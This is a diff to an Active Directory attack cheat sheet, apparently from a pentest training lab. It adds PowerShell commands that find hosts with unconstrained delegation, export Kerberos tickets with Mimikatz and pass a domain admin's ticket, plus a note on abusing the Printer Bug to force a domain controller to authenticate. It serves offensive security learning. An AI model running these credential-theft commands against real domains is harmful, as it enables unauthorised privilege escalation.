@@ -123,8 +123,35 @@ Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList
 
 ---
 ### Kerberos Unconstrained Delegation
-- Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server".
-- This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
-- For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.
-- Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.
 
+Discover domain computers which have unconstrained delegation enabled:
+```powershell
+Get-DomainComputer -UnConstrained
+```
+
+```powershell
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+```
+
+```powershell
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+```
+
+#### Attack
+- Compromise the server(s) where Unconstrained delegation is enabled.
+- We must trick or wait for a domain admin to connect a service on appsrv.
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+
+- The DA token could be reused:
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt
+C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
+60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
+
+##### Printer Bug
+- MS-RPRN feature which _allows any domain authenticated user_ _to force any machine_ (running the Spooler service) _to connect to second a machine of the domain user's choice_.
+- We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug
